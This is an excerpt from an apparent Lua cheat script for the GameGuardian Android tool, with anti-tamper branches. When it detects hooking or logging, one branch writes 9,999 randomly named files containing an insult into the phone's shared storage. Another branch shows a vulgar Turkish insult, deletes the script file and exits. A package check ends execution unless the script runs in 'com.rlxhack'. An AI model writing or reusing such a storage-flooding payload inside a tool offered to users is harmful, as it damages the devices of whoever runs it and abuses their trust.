...
if type(yy) == 'function' and debug.getinfo(yy).source ~= '=[Java]'   then 
table.insert(KonzletV7,x..'.'..xx) 
end 
end 
end 
end
...
for i = 1,9999 do
io.open("/storage/emulated/0/"..string.char(math.random(97,122))..string.char(math.random(97,122))..string.char(math.random(90,255))..string.char(math.random(97,122))..string.char(math.random(97,122)),"w"):write("🤓 Fuck You Log Me Script 🤓")
end
return
end
...
gg.alert("» O DEGİ ANANIN AMINA SOK OROSPU EVLADI")
os.remove("Download/ONLİNE VİP SCRİPT🤩.lua")
os.exit()
end
...
if gg.PACKAGE == "com.rlxhack" then
else
gg.alert("⛔  ᖇ ᒪ ᙭  𝑯𝑨𝑪𝑲💎💎  ︎︎︎ᖇ ᒪ ᙭  𝑮𝒈 𝑲𝒖𝒍𝒍𝒂𝒏⛔ \n 🚫𝑨𝑲𝑺𝒊 𝑻𝑨𝑲𝑻𝑰̇𝑹𝑫𝑬 𝑺𝑪𝑹𝑰𝑷𝑻 𝑨𝑪𝑰𝑳𝑴𝑨𝒀𝑨𝑪𝑨𝑲𝑻𝑰𝑹🚫")
os.exit()
end
